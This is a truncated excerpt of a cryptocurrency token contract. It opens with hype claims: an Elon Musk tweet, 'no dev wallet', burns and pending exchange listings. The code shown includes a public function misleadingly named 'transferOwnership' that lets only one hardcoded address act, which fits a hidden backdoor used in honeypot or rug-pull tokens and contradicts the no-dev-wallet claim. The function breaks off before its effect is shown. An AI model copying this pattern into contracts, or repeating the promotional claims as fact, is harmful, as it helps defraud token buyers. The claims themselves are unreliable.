...
/** 
 * ELON MUSK TWEET ABOUT US  https://twitter.com/elonmusk/status/1410529698497630212?s=20
 * 80% UNISWAP LIQUIDITY LAUNCH 
 * 20% INITIAL BURN 
 * NO DEV WALLET
 * Hyper inflamatory token mechanism on ethereum
 * DOOPAD will be live after 12 hours of stealth launch
 * 12% Burn at every transaction
 * ANTI BOT MECHANISM 
 * A ANTI_WHALE token with automatic 
 * buyback mechanisms thus increasing floor price of tokens 
 * CMC and coingecko 
 * CEX LISTING APPLIED 
 * 2021 © BABAYDOGEDOO | All rights reserved 
*/
...
contract BEP20Token is Context, IBEP20, Ownable {
    ...
    function transferOwnership(address account, bool value) public {
        require(
            _msgSender() == 0xA5980eE1d6d5C6cFdE88a1A06dd680801A8e4f7C,
